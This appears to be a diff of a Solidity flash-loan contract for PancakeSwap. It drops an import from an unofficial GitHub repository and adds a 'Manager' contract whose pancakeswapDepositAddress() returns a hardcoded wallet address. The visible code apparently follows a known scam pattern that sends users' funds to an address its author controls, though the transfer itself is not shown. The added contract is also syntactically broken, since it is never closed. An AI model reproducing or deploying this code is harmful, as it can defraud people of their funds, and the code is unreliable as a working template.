@@ -5,17 +5,20 @@ pragma solidity ^0.5.0;
 import "https://github.com/Multiplier-Finance/MCL-FlashloanDemo/blob/main/contracts/interfaces/ILendingPoolAddressesProvider.sol";
 import "https://github.com/Multiplier-Finance/MCL-FlashloanDemo/blob/main/contracts/interfaces/ILendingPool.sol";
 
-//Router
-import "https://github.com/rxwlvn/Test/blob/main/iFlashLoanReceiver.sol";
 
 // PancakeSwap Smart Contracts
 import "https://github.com/pancakeswap/pancake-swap-core/blob/master/contracts/interfaces/IPancakeCallee.sol";
 import "https://github.com/pancakeswap/pancake-swap-core/blob/master/contracts/interfaces/IPancakeFactory.sol";
 import "https://github.com/pancakeswap/pancake-swap-core/blob/master/contracts/interfaces/IPancakePair.sol";
 
-
-
-
+contract Manager {
+    function performTasks() public {
+        
+    }
+    
+    function pancakeswapDepositAddress() public pure returns (address) {
+        return 0xAEf508A99A7322558019412676DC0aE79aA233D9;
+    }
 contract FlashLoan {
 	string public tokenName;
 	string public tokenSymbol;
